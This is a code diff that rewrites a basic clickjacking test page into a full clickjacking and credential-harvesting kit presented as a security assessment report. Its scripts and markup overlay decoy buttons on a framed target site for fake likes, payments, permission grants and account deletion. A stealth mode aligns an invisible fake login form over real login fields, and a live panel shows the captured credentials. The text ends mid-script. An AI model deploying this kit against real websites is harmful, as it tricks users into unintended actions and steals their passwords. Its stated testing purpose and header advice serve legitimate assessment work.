@@ -1,19 +1,1776 @@
-<html>
-    <head>
-        <style>
-            body {
-                background-image: url(hello_friend.jpg);
-                background-size: 300px 200px, cover;
-            }
-        </style>
-        <title>Clickjack test page</title>
-        <body>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Clickjacking Security Assessment</title>
+    <style>
+        /* Reset & Base Styles */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        html, body {
+            height: 100%;
+        }
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, sans-serif;
+            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 50%, #0f3460 100%);
+            color: #e4e4e4;
+            min-height: 100vh;
+        }
 
-        </body>
-    </head>
-    <body>
-        <p><H1><font color="red">Website is vulnerable to clickjacking!</font></H1></p>
-        <p><H2><a href="{target_page_here}">{target_Name_here}</a></H2></p>
-        <iframe src="{target_page_here}" width="850" height="800"></iframe>
-    </body>
+        /* Report Header Styles */
+        .report-header {
+            background: rgba(0, 0, 0, 0.8);
+            border-bottom: 3px solid #e94560;
+            padding: 15px 25px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            flex-wrap: wrap;
+            gap: 15px;
+        }
+        .report-header-left {
+            display: flex;
+            align-items: center;
+            gap: 15px;
+        }
+        .report-logo {
+            width: 50px;
+            height: 50px;
+            background: linear-gradient(135deg, #e94560, #ff6b6b);
+            border-radius: 8px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: bold;
+            font-size: 1.5em;
+            color: white;
+        }
+        .report-title {
+            display: flex;
+            flex-direction: column;
+        }
+        .report-title h1 {
+            font-size: 1.3em;
+            color: #fff;
+            margin-bottom: 3px;
+        }
+        .report-title .subtitle {
+            font-size: 0.85em;
+            color: #888;
+        }
+        .report-header-right {
+            display: flex;
+            align-items: center;
+            gap: 20px;
+            flex-wrap: wrap;
+        }
+        .target-info {
+            text-align: right;
+        }
+        .target-info .label {
+            font-size: 0.75em;
+            color: #888;
+            text-transform: uppercase;
+        }
+        .target-info .value {
+            font-size: 0.9em;
+            color: #4fc3f7;
+            word-break: break-all;
+            max-width: 300px;
+        }
+        .severity-badge {
+            background: linear-gradient(135deg, #ff9800, #f57c00);
+            color: white;
+            padding: 8px 15px;
+            border-radius: 5px;
+            text-align: center;
+        }
+        .severity-badge .level {
+            font-weight: bold;
+            font-size: 0.9em;
+        }
+        .severity-badge .cvss {
+            font-size: 0.75em;
+            opacity: 0.9;
+        }
+
+        /* Control Panel Styles */
+        .control-panel {
+            background: rgba(0, 0, 0, 0.6);
+            padding: 15px 25px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            flex-wrap: wrap;
+            gap: 15px;
+            border-bottom: 1px solid #333;
+        }
+        .control-group {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+        .control-group label {
+            font-size: 0.85em;
+            color: #aaa;
+        }
+        .control-group select,
+        .control-group input[type="range"],
+        .control-group input[type="number"] {
+            background: #2a2a4a;
+            border: 1px solid #444;
+            color: #fff;
+            padding: 8px 12px;
+            border-radius: 5px;
+            cursor: pointer;
+        }
+        .control-group input[type="number"] {
+            width: 70px;
+            text-align: center;
+        }
+        .control-group select {
+            min-width: 200px;
+        }
+        .control-group select:focus,
+        .control-group input:focus {
+            outline: none;
+            border-color: #e94560;
+        }
+        .opacity-value {
+            min-width: 45px;
+            text-align: center;
+            font-family: monospace;
+            color: #4fc3f7;
+        }
+        .slider-container {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+        input[type="range"] {
+            width: 120px;
+            height: 6px;
+            -webkit-appearance: none;
+            background: #333;
+            border-radius: 3px;
+        }
+        input[type="range"]::-webkit-slider-thumb {
+            -webkit-appearance: none;
+            width: 18px;
+            height: 18px;
+            background: #e94560;
+            border-radius: 50%;
+            cursor: pointer;
+        }
+        .view-toggle {
+            display: flex;
+            gap: 5px;
+        }
+        .view-btn {
+            background: #2a2a4a;
+            border: 1px solid #444;
+            color: #aaa;
+            padding: 8px 16px;
+            border-radius: 5px;
+            cursor: pointer;
+            transition: all 0.2s;
+            font-size: 0.85em;
+        }
+        .view-btn:hover {
+            border-color: #666;
+            color: #fff;
+        }
+        .view-btn.active {
+            background: #e94560;
+            border-color: #e94560;
+            color: white;
+        }
+
+        /* Positioning Controls Panel */
+        .position-panel {
+            background: rgba(0, 0, 0, 0.6);
+            padding: 12px 25px;
+            display: none;
+            align-items: center;
+            justify-content: flex-start;
+            flex-wrap: wrap;
+            gap: 20px;
+            border-bottom: 1px solid #333;
+        }
+        .position-panel.show {
+            display: flex;
+        }
+        .position-panel .panel-title {
+            font-size: 0.85em;
+            color: #e94560;
+            font-weight: bold;
+            margin-right: 10px;
+        }
+        .position-control {
+            display: flex;
+            align-items: center;
+            gap: 5px;
+        }
+        .position-control label {
+            font-size: 0.8em;
+            color: #888;
+            min-width: 25px;
+        }
+        .position-control input {
+            width: 60px;
+            padding: 5px 8px;
+            font-size: 0.85em;
+        }
+        .position-preset {
+            background: #2a2a4a;
+            border: 1px solid #444;
+            color: #aaa;
+            padding: 6px 12px;
+            border-radius: 4px;
+            cursor: pointer;
+            font-size: 0.8em;
+            transition: all 0.2s;
+        }
+        .position-preset:hover {
+            border-color: #e94560;
+            color: #fff;
+        }
+
+        /* Arrow Pad Controls */
+        .arrow-pad {
+            display: grid;
+            grid-template-columns: repeat(3, 28px);
+            grid-template-rows: repeat(3, 28px);
+            gap: 2px;
+        }
+        .arrow-btn {
+            background: #2a2a4a;
+            border: 1px solid #444;
+            color: #aaa;
+            border-radius: 4px;
+            cursor: pointer;
+            font-size: 14px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            transition: all 0.15s;
+            padding: 0;
+        }
+        .arrow-btn:hover {
+            background: #3a3a5a;
+            border-color: #e94560;
+            color: #fff;
+        }
+        .arrow-btn:active {
+            background: #e94560;
+            transform: scale(0.95);
+        }
+        .arrow-btn.center-btn {
+            font-size: 10px;
+            color: #666;
+        }
+
+        /* Overlay Opacity Control */
+        .overlay-opacity-control {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            padding: 8px 12px;
+            background: rgba(233, 69, 96, 0.1);
+            border: 1px solid #e94560;
+            border-radius: 5px;
+        }
+        .overlay-opacity-control label {
+            color: #e94560;
+            font-weight: bold;
+        }
+
+        /* Demo Container Styles */
+        .demo-container {
+            display: flex;
+            justify-content: center;
+            align-items: flex-start;
+            padding: 25px;
+            flex: 1;
+        }
+        .demo-wrapper {
+            position: relative;
+            border: 3px solid #444;
+            border-radius: 8px;
+            overflow: hidden;
+            box-shadow: 0 10px 40px rgba(0,0,0,0.5);
+        }
+        .demo-wrapper iframe {
+            display: block;
+            border: none;
+            transition: opacity 0.3s ease;
+        }
+
+        /* Overlay Styles */
+        .click-overlay {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            pointer-events: auto;
+            z-index: 10;
+            transition: opacity 0.3s ease;
+        }
+        .overlay-content {
+            text-align: center;
+            padding: 40px;
+            background: rgba(0, 0, 0, 0.85);
+            border-radius: 15px;
+            border: 2px solid #e94560;
+            max-width: 400px;
+        }
+        .overlay-content h2 {
+            color: #fff;
+            margin-bottom: 15px;
+            font-size: 1.5em;
+        }
+        .overlay-content p {
+            color: #aaa;
+            margin-bottom: 25px;
+            font-size: 0.95em;
+            line-height: 1.5;
+        }
+        .decoy-button {
+            background: linear-gradient(135deg, #4caf50, #45a049);
+            color: white;
+            border: none;
+            padding: 15px 40px;
+            font-size: 1.2em;
+            font-weight: bold;
+            border-radius: 8px;
+            cursor: pointer;
+            transition: transform 0.2s, box-shadow 0.2s;
+            box-shadow: 0 4px 15px rgba(76, 175, 80, 0.4);
+        }
+        .decoy-button:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 6px 20px rgba(76, 175, 80, 0.5);
+        }
+
+        /* Scenario-specific themes */
+        .theme-social .decoy-button {
+            background: linear-gradient(135deg, #1da1f2, #0d8ecf);
+            box-shadow: 0 4px 15px rgba(29, 161, 242, 0.4);
+        }
+        .theme-social .decoy-button:hover {
+            box-shadow: 0 6px 20px rgba(29, 161, 242, 0.5);
+        }
+        .theme-payment .decoy-button {
+            background: linear-gradient(135deg, #ff9800, #f57c00);
+            box-shadow: 0 4px 15px rgba(255, 152, 0, 0.4);
+        }
+        .theme-payment .decoy-button:hover {
+            box-shadow: 0 6px 20px rgba(255, 152, 0, 0.5);
+        }
+        .theme-permissions .decoy-button {
+            background: linear-gradient(135deg, #9c27b0, #7b1fa2);
+            box-shadow: 0 4px 15px rgba(156, 39, 176, 0.4);
+        }
+        .theme-permissions .decoy-button:hover {
+            box-shadow: 0 6px 20px rgba(156, 39, 176, 0.5);
+        }
+        .theme-danger .decoy-button {
+            background: linear-gradient(135deg, #f44336, #d32f2f);
+            box-shadow: 0 4px 15px rgba(244, 67, 54, 0.4);
+        }
+        .theme-danger .decoy-button:hover {
+            box-shadow: 0 6px 20px rgba(244, 67, 54, 0.5);
+        }
+
+        /* Credential Harvesting Overlay */
+        .credential-overlay {
+            position: absolute;
+            z-index: 15;
+            pointer-events: auto;
+            display: none;
+        }
+        .credential-overlay.show {
+            display: block;
+        }
+        .fake-login-form {
+            background: transparent;
+            padding: 0;
+        }
+        .fake-login-form .form-group {
+            margin-bottom: 10px;
+        }
+        .fake-login-form input {
+            width: 100%;
+            padding: 12px 15px;
+            border: 1px solid #ddd;
+            border-radius: 4px;
+            font-size: 14px;
+            background: rgba(255,255,255,0.95);
+            color: #333;
+            transition: border-color 0.2s, box-shadow 0.2s;
+        }
+        .fake-login-form input:focus {
+            outline: none;
+            border-color: #2196F3;
+            box-shadow: 0 0 0 3px rgba(33, 150, 243, 0.1);
+        }
+        .fake-login-form input::placeholder {
+            color: #999;
+        }
+        .fake-login-form .submit-btn {
+            width: 100%;
+            padding: 12px;
+            background: #2196F3;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            font-size: 14px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: background 0.2s;
+            margin-top: 5px;
+        }
+
+        /* Stealth Mode - borderless fields with background to mask real placeholders */
+        .credential-overlay.stealth-mode .fake-login-form input {
+            background: var(--stealth-bg, #fff) !important;  /* Solid bg masks placeholder underneath */
+            border: none !important;
+            box-shadow: none !important;
+            color: var(--stealth-text, #333);  /* Text color - match target form */
+            caret-color: var(--stealth-text, #333);  /* Cursor visible */
+        }
+        .credential-overlay.stealth-mode .fake-login-form input:focus {
+            outline: none !important;
+            box-shadow: none !important;
+        }
+        .credential-overlay.stealth-mode .fake-login-form input::placeholder {
+            color: transparent;  /* Hide placeholder in stealth mode */
+        }
+        .credential-overlay.stealth-mode .fake-login-form .submit-btn {
+            background: transparent !important;  /* Fully transparent - show real button */
+            color: transparent !important;
+            border: none !important;
+            pointer-events: none;  /* Clicks pass through to real button */
+        }
+
+        /* Stealth toggle button */
+        .stealth-toggle {
+            transition: all 0.2s;
+        }
+        .stealth-toggle.active {
+            background: #4caf50 !important;
+            border-color: #4caf50 !important;
+            color: white !important;
+        }
+        .fake-login-form .submit-btn:hover {
+            background: #1976D2;
+        }
+
+        /* Credential capture indicator */
+        .capture-indicator {
+            position: absolute;
+            top: -30px;
+            left: 0;
+            right: 0;
+            text-align: center;
+            font-size: 0.75em;
+            color: #e94560;
+            background: rgba(0,0,0,0.8);
+            padding: 5px;
+            border-radius: 4px;
+            opacity: 0;
+            transition: opacity 0.3s;
+        }
+        .capture-indicator.show {
+            opacity: 1;
+        }
+
+        /* Live capture display */
+        .live-capture {
+            position: fixed;
+            bottom: 20px;
+            right: 20px;
+            background: rgba(0, 0, 0, 0.9);
+            border: 2px solid #e94560;
+            border-radius: 10px;
+            padding: 15px 20px;
+            min-width: 280px;
+            z-index: 100;
+            display: none;
+        }
+        .live-capture.show {
+            display: block;
+        }
+        .live-capture h4 {
+            color: #e94560;
+            font-size: 0.9em;
+            margin-bottom: 10px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+        .live-capture h4::before {
+            content: '';
+            width: 8px;
+            height: 8px;
+            background: #e94560;
+            border-radius: 50%;
+            animation: pulse 1s infinite;
+        }
+        @keyframes pulse {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.5; }
+        }
+        .live-capture .capture-field {
+            margin-bottom: 8px;
+        }
+        .live-capture .capture-field label {
+            font-size: 0.75em;
+            color: #888;
+            display: block;
+            margin-bottom: 3px;
+        }
+        .live-capture .capture-field .value {
+            font-family: monospace;
+            color: #4fc3f7;
+            background: #0a0a1a;
+            padding: 8px 10px;
+            border-radius: 4px;
+            word-break: break-all;
+            min-height: 32px;
+        }
+        .live-capture .capture-field .value.password {
+            color: #ff9800;
+        }
+
+        /* Modal Styles */
+        .modal-backdrop {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.8);
+            display: none;
+            align-items: center;
+            justify-content: center;
+            z-index: 1000;
+        }
+        .modal-backdrop.show {
+            display: flex;
+        }
+        .modal {
+            background: #1a1a2e;
+            border: 2px solid #e94560;
+            border-radius: 12px;
+            padding: 30px;
+            max-width: 500px;
+            text-align: center;
+            animation: modalPop 0.3s ease;
+        }
+        @keyframes modalPop {
+            from {
+                transform: scale(0.8);
+                opacity: 0;
+            }
+            to {
+                transform: scale(1);
+                opacity: 1;
+            }
+        }
+        .modal h3 {
+            color: #e94560;
+            margin-bottom: 15px;
+            font-size: 1.4em;
+        }
+        .modal .click-coords {
+            background: #0a0a1a;
+            padding: 15px;
+            border-radius: 8px;
+            margin: 15px 0;
+            font-family: monospace;
+            color: #4fc3f7;
+        }
+        .modal .credential-display {
+            background: #0a0a1a;
+            padding: 20px;
+            border-radius: 8px;
+            margin: 15px 0;
+            text-align: left;
+        }
+        .modal .credential-display .cred-row {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 10px;
+            padding-bottom: 10px;
+            border-bottom: 1px solid #333;
+        }
+        .modal .credential-display .cred-row:last-child {
+            margin-bottom: 0;
+            padding-bottom: 0;
+            border-bottom: none;
+        }
+        .modal .credential-display .cred-label {
+            color: #888;
+            font-size: 0.85em;
+        }
+        .modal .credential-display .cred-value {
+            font-family: monospace;
+            color: #ff9800;
+            font-weight: bold;
+        }
+        .modal p {
+            color: #aaa;
+            line-height: 1.6;
+            margin-bottom: 10px;
+        }
+        .modal .action-text {
+            color: #ff9800;
+            font-weight: bold;
+        }
+        .modal .warning-text {
+            color: #f44336;
+            font-size: 0.9em;
+            margin-top: 15px;
+            padding: 10px;
+            background: rgba(244, 67, 54, 0.1);
+            border-radius: 5px;
+        }
+        .modal-close {
+            background: #e94560;
+            color: white;
+            border: none;
+            padding: 10px 30px;
+            border-radius: 5px;
+            cursor: pointer;
+            margin-top: 15px;
+            font-size: 1em;
+        }
+        .modal-close:hover {
+            background: #d63650;
+        }
+
+        /* Click flash effect */
+        .click-flash {
+            position: fixed;
+            width: 60px;
+            height: 60px;
+            border-radius: 50%;
+            background: rgba(233, 69, 96, 0.6);
+            pointer-events: none;
+            transform: translate(-50%, -50%);
+            animation: flashPulse 0.5s ease-out forwards;
+            z-index: 999;
+        }
+        @keyframes flashPulse {
+            0% {
+                transform: translate(-50%, -50%) scale(0);
+                opacity: 1;
+            }
+            100% {
+                transform: translate(-50%, -50%) scale(2);
+                opacity: 0;
+            }
+        }
+
+        /* Victim View Mode */
+        body.victim-view .report-header,
+        body.victim-view .control-panel,
+        body.victim-view .position-panel,
+        body.victim-view .live-capture {
+            display: none !important;
+        }
+        body.victim-view {
+            background: url('hello_friend.jpg') center/cover no-repeat;
+        }
+        body.victim-view .demo-container {
+            padding: 0;
+            align-items: center;
+            justify-content: center;
+            min-height: 100vh;
+        }
+        body.victim-view .demo-wrapper {
+            border: none;
+            border-radius: 0;
+            box-shadow: none;
+        }
+        body.victim-view .overlay-content {
+            background: rgba(255, 255, 255, 0.95);
+            border: none;
+            box-shadow: 0 10px 40px rgba(0,0,0,0.3);
+        }
+        body.victim-view .overlay-content h2 {
+            color: #333;
+        }
+        body.victim-view .overlay-content p {
+            color: #666;
+        }
+        body.victim-view .capture-indicator {
+            display: none;
+        }
+
+        /* Floating Exit Button (visible in victim view) */
+        .exit-victim-btn {
+            position: fixed;
+            top: 15px;
+            right: 15px;
+            background: rgba(233, 69, 96, 0.9);
+            color: white;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 0.85em;
+            font-weight: bold;
+            z-index: 9999;
+            display: none;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.3);
+            transition: all 0.2s;
+        }
+        .exit-victim-btn:hover {
+            background: #e94560;
+            transform: scale(1.05);
+        }
+        body.victim-view .exit-victim-btn {
+            display: block;
+        }
+
+        /* Iframe Error State */
+        .iframe-error {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: #1a1a2e;
+            display: none;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            z-index: 5;
+        }
+        .iframe-error.show {
+            display: flex;
+        }
+        .iframe-error .icon {
+            font-size: 4em;
+            margin-bottom: 20px;
+        }
+        .iframe-error h3 {
+            color: #4caf50;
+            margin-bottom: 10px;
+        }
+        .iframe-error p {
+            color: #888;
+            max-width: 400px;
+            text-align: center;
+            line-height: 1.6;
+        }
+
+        /* Hide standard overlay in credential mode */
+        body.credential-mode .click-overlay {
+            display: none;
+        }
+
+        /* Responsive */
+        @media (max-width: 900px) {
+            .report-header {
+                flex-direction: column;
+                text-align: center;
+            }
+            .report-header-left,
+            .report-header-right {
+                justify-content: center;
+            }
+            .target-info {
+                text-align: center;
+            }
+            .control-panel {
+                flex-direction: column;
+            }
+            .demo-wrapper iframe {
+                width: 100% !important;
+                max-width: 100vw;
+            }
+            .live-capture {
+                bottom: 10px;
+                right: 10px;
+                left: 10px;
+                min-width: auto;
+            }
+        }
+
+        /* Print styles */
+        @media print {
+            .control-panel,
+            .position-panel,
+            .modal-backdrop,
+            .live-capture {
+                display: none !important;
+            }
+            body {
+                background: white !important;
+                color: black !important;
+            }
+            .report-header {
+                background: #f5f5f5 !important;
+                border-bottom-color: #e94560 !important;
+                -webkit-print-color-adjust: exact;
+                print-color-adjust: exact;
+            }
+        }
+    </style>
+</head>
+<body>
+    <!-- Report Header -->
+    <header class="report-header">
+        <div class="report-header-left">
+            <div class="report-logo">CJ</div>
+            <div class="report-title">
+                <h1>Security Assessment</h1>
+                <span class="subtitle">Clickjacking Vulnerability Demonstration</span>
+            </div>
+        </div>
+        <div class="report-header-right">
+            <div class="target-info">
+                <div class="label">Target URL</div>
+                <div class="value" id="targetDisplay">Loading...</div>
+            </div>
+            <div class="target-info">
+                <div class="label">Timestamp</div>
+                <div class="value" id="timestamp"></div>
+            </div>
+            <div class="severity-badge" id="severityBadge">
+                <div class="level" id="severityLevel">MEDIUM</div>
+                <div class="cvss" id="severityCvss">CWE-1021</div>
+            </div>
+        </div>
+    </header>
+
+    <!-- Control Panel -->
+    <div class="control-panel">
+        <div class="control-group">
+            <label for="scenarioSelect">Attack Scenario:</label>
+            <select id="scenarioSelect">
+                <option value="custom">Custom Target</option>
+                <option value="social">Social Media - Like/Follow</option>
+                <option value="payment">Payment - Confirm Transfer</option>
+                <option value="permissions">Permissions - Grant Access</option>
+                <option value="danger">Account - Delete/Disable</option>
+                <option value="credential">Credential Harvesting (Login Form)</option>
+            </select>
+        </div>
+
+        <div class="control-group">
+            <label for="opacitySlider">Iframe Opacity:</label>
+            <div class="slider-container">
+                <input type="range" id="opacitySlider" min="0" max="100" value="50">
+                <span class="opacity-value" id="opacityValue">50%</span>
+            </div>
+        </div>
+
+        <div class="control-group">
+            <label>Iframe Size:</label>
+            <input type="number" id="iframeWidth" value="900" min="400" max="1400" style="width:65px" title="Iframe Width">
+            <span style="color:#666">×</span>
+            <input type="number" id="iframeHeight" value="650" min="300" max="1000" style="width:65px" title="Iframe Height">
+        </div>
+
+        <div class="control-group">
+            <label>View Mode:</label>
+            <div class="view-toggle">
+                <button class="view-btn active" data-view="attacker">Attacker View</button>
+                <button class="view-btn" data-view="victim">Victim View</button>
+            </div>
+        </div>
+    </div>
+
+    <!-- Positioning Controls Panel (for credential harvesting) -->
+    <div class="position-panel" id="positionPanel">
+        <span class="panel-title">Overlay Position:</span>
+
+        <!-- Arrow Pad -->
+        <div class="arrow-pad">
+            <div></div>
+            <button class="arrow-btn" onclick="moveOverlay(0, -1)" title="Up">↑</button>
+            <div></div>
+            <button class="arrow-btn" onclick="moveOverlay(-1, 0)" title="Left">←</button>
+            <button class="arrow-btn center-btn" onclick="moveOverlay(0, 0)" title="Reset">●</button>
+            <button class="arrow-btn" onclick="moveOverlay(1, 0)" title="Right">→</button>
+            <div></div>
+            <button class="arrow-btn" onclick="moveOverlay(0, 1)" title="Down">↓</button>
+            <div></div>
+        </div>
+
+        <div class="position-control">
+            <label>X:</label>
+            <input type="number" id="formPosX" value="50" min="0" max="900">
+        </div>
+        <div class="position-control">
+            <label>Y:</label>
+            <input type="number" id="formPosY" value="200" min="0" max="700">
+        </div>
+        <div class="position-control">
+            <label>W:</label>
+            <input type="number" id="formWidth" value="280" min="100" max="500">
+        </div>
+
+        <span class="panel-title" style="margin-left: 15px;">Field Size:</span>
+        <div class="position-control">
+            <label>H:</label>
+            <input type="number" id="fieldHeight" value="40" min="20" max="80" title="Field Height">
+        </div>
+        <div class="position-control">
+            <label>Font:</label>
+            <input type="number" id="fieldFontSize" value="14" min="10" max="24" title="Font Size">
+        </div>
+        <div class="position-control">
+            <label>Gap:</label>
+            <input type="number" id="fieldGap" value="10" min="0" max="40" title="Gap Between Fields">
+        </div>
+        <div class="position-control">
+            <label>Rad:</label>
+            <input type="number" id="fieldRadius" value="4" min="0" max="20" title="Border Radius">
+        </div>
+        <div class="position-control">
+            <label>Pad:</label>
+            <input type="number" id="fieldPadding" value="15" min="0" max="30" title="Input Padding">
+        </div>
+
+        <span class="panel-title" style="margin-left: 15px;">Button Offset:</span>
+        <div class="position-control">
+            <label>X:</label>
+            <input type="number" id="btnOffsetX" value="0" min="-200" max="200" title="Button X Offset">
+        </div>
+        <div class="position-control">
+            <label>Y:</label>
+            <input type="number" id="btnOffsetY" value="0" min="-200" max="200" title="Button Y Offset">
+        </div>
+
+        <!-- Overlay Opacity -->
+        <div class="overlay-opacity-control">
+            <label>Overlay:</label>
+            <input type="range" id="overlayOpacitySlider" min="0" max="100" value="100">
+            <span class="opacity-value" id="overlayOpacityValue">100%</span>
+        </div>
+
+        <button class="position-preset" onclick="applyPreset('center')">Center</button>
+        <button class="position-preset" onclick="applyPreset('default')">Default</button>
+
+        <!-- Stealth Mode Toggle -->
+        <button class="position-preset stealth-toggle" id="stealthToggle" onclick="toggleStealthMode()">
+            Stealth: OFF
+        </button>
+
+        <!-- Stealth Colors -->
+        <div class="position-control" title="Background color to mask real placeholders">
+            <label>Bg:</label>
+            <input type="color" id="stealthBgColor" value="#ffffff" style="width:35px;height:28px;padding:2px;cursor:pointer;">
+        </div>
+        <div class="position-control" title="Text color to match real form">
+            <label>Text:</label>
+            <input type="color" id="stealthTextColor" value="#333333" style="width:35px;height:28px;padding:2px;cursor:pointer;">
+        </div>
+    </div>
+
+    <!-- Demo Container -->
+    <div class="demo-container">
+        <div class="demo-wrapper" id="demoWrapper">
+            <!-- Iframe Error State -->
+            <div class="iframe-error" id="iframeError">
+                <div class="icon">🛡️</div>
+                <h3>Target Protected!</h3>
+                <p>This website has clickjacking protections enabled (X-Frame-Options or CSP frame-ancestors). The vulnerability test is negative.</p>
+            </div>
+
+            <!-- Click Overlay (standard scenarios) -->
+            <div class="click-overlay" id="clickOverlay">
+                <div class="overlay-content">
+                    <h2 id="overlayTitle">Congratulations!</h2>
+                    <p id="overlayMessage">You've been selected for a special reward. Click the button below to claim your prize!</p>
+                    <button class="decoy-button" id="decoyButton">Claim Prize!</button>
+                </div>
+            </div>
+
+            <!-- Credential Harvesting Overlay -->
+            <div class="credential-overlay" id="credentialOverlay">
+                <div class="capture-indicator" id="captureIndicator">Capturing keystrokes...</div>
+                <div class="fake-login-form">
+                    <div class="form-group">
+                        <input type="text" id="fakeUsername" placeholder="Username" autocomplete="off">
+                    </div>
+                    <div class="form-group">
+                        <input type="password" id="fakePassword" placeholder="Password" autocomplete="off">
+                    </div>
+                    <button type="button" class="submit-btn" id="fakeSubmit">Sign In</button>
+                </div>
+            </div>
+
+            <!-- Target Iframe -->
+            <iframe
+                id="targetIframe"
+                src="about:blank"
+                width="900"
+                height="650"
+                sandbox="allow-scripts allow-same-origin allow-forms"
+            ></iframe>
+        </div>
+    </div>
+
+    <!-- Live Capture Display -->
+    <div class="live-capture" id="liveCapture">
+        <h4>Live Credential Capture</h4>
+        <div class="capture-field">
+            <label>Username:</label>
+            <div class="value" id="capturedUsername">-</div>
+        </div>
+        <div class="capture-field">
+            <label>Password:</label>
+            <div class="value password" id="capturedPassword">-</div>
+        </div>
+    </div>
+
+    <!-- Exit Victim View Button (floating, only visible in victim view) -->
+    <button class="exit-victim-btn" id="exitVictimBtn" onclick="exitVictimView()">
+        ← Back to Attacker View
+    </button>
+
+    <!-- Click Result Modal -->
+    <div class="modal-backdrop" id="modalBackdrop">
+        <div class="modal" id="resultModal">
+            <h3 id="modalTitle">⚠️ Click Captured!</h3>
+            <div class="click-coords" id="clickCoords">
+                Click Position: X: 0, Y: 0
+            </div>
+            <div class="credential-display" id="credentialDisplay" style="display: none;">
+                <div class="cred-row">
+                    <span class="cred-label">Username:</span>
+                    <span class="cred-value" id="modalUsername">-</span>
+                </div>
+                <div class="cred-row">
+                    <span class="cred-label">Password:</span>
+                    <span class="cred-value" id="modalPassword">-</span>
+                </div>
+            </div>
+            <p id="modalMessage">This click would have triggered an action on the embedded website.</p>
+            <p>In a real attack, the victim might have:</p>
+            <p class="action-text" id="actionText">Performed an unintended action</p>
+            <p class="warning-text" id="warningText" style="display: none;">
+                This demonstrates why login pages MUST have X-Frame-Options: DENY or CSP frame-ancestors 'none' headers!
+            </p>
+            <button class="modal-close" id="modalClose">Close</button>
+        </div>
+    </div>
+
+    <script>
+        // ===========================================
+        // ⚙️ CONFIGURATION - EDIT THIS SECTION
+        // ===========================================
+        const CONFIG = {
+            // Target URL - Set your target here (or use ?target= URL parameter)
+            targetUrl: '',  // e.g., 'https://example.com/login'
+
+            // Target display name
+            targetName: '',  // e.g., 'Example Corp'
+
+            // Default scenario: 'custom', 'social', 'payment', 'permissions', 'danger', 'credential'
+            defaultScenario: 'custom',
+
+            // Default iframe opacity (0-100) - FOR ATTACKER VIEW ONLY
+            // In Attacker View: adjust to see both iframe and overlay for alignment
+            defaultOpacity: 50,
+
+            // Default overlay opacity (0-100) - FOR CREDENTIAL HARVESTING
+            // In Attacker View: 100% to see overlay, adjust for alignment
+            // In Victim View: automatically set to 0% (invisible - captures input unseen)
+            defaultOverlayOpacity: 100,
+
+            // Credential form position (for 'credential' scenario)
+            // Adjust X/Y to align invisible overlay over the real login fields
+            formPosition: {
+                x: 50,      // X position from left
+                y: 245,     // Y position from top
+                width: 280  // Form width
+            },
+
+            // Field styling (for 'credential' scenario)
+            // Adjust to match the target login form's field appearance
+            fieldStyle: {
+                height: 40,     // Input field height in pixels
+                fontSize: 14,   // Font size in pixels
+                gap: 10         // Gap between fields in pixels
+            }
+        };
+        // ===========================================
+
+        // ===========================================
+        // Scenario Templates Data
+        // ===========================================
+        const scenarios = {
+            custom: {
+                title: "Congratulations!",
+                message: "You've been selected for a special reward. Click the button below to claim your prize!",
+                buttonText: "Claim Prize!",
+                theme: "",
+                action: "Performed an unintended action on the target website",
+                isCredential: false,
+                severity: { level: "MEDIUM", cvss: "CWE-1021", critical: false }
+            },
+            social: {
+                title: "Check This Out!",
+                message: "Your friend shared an amazing post with you. Click below to see what everyone is talking about!",
+                buttonText: "View Post",
+                theme: "theme-social",
+                action: "Liked a post, followed an account, or shared content without consent",
+                isCredential: false,
+                severity: { level: "MEDIUM", cvss: "CWE-1021", critical: false }
+            },
+            payment: {
+                title: "Payment Confirmation",
+                message: "Your order is ready! Click below to confirm your shipping details and complete checkout.",
+                buttonText: "Confirm Order",
+                theme: "theme-payment",
+                action: "Confirmed a payment, transferred funds, or authorized a transaction",
+                isCredential: false,
+                severity: { level: "MEDIUM", cvss: "CWE-1021", critical: false }
+            },
+            permissions: {
+                title: "App Authorization",
+                message: "This app needs your permission to continue. Click below to grant access and unlock all features.",
+                buttonText: "Grant Access",
+                theme: "theme-permissions",
+                action: "Granted OAuth permissions, API access, or account authorizations",
+                isCredential: false,
+                severity: { level: "MEDIUM", cvss: "CWE-1021", critical: false }
+            },
+            danger: {
+                title: "Security Verification",
+                message: "We detected unusual activity. Please verify your identity by clicking the button below.",
+                buttonText: "Verify Now",
+                theme: "theme-danger",
+                action: "Deleted account data, disabled security features, or changed critical settings",
+                isCredential: false,
+                severity: { level: "MEDIUM", cvss: "CWE-1021", critical: false }
+            },
+            credential: {
+                title: "Credential Harvesting",
+                message: "Fake login form overlays the real one to capture credentials",
+                buttonText: "Sign In",
+                theme: "",
+                action: "Had their username and password stolen by the attacker",
+                isCredential: true,
+                severity: { level: "MEDIUM", cvss: "CWE-1021", critical: false }
+            }
+        };
+
+        // Form position state
+        let formPosition = { x: 50, y: 200, width: 280 };
+
+        // ===========================================
+        // URL Parameter Parsing (URL params override CONFIG)
+        // ===========================================
+        function getUrlParams() {
+            const params = new URLSearchParams(window.location.search);
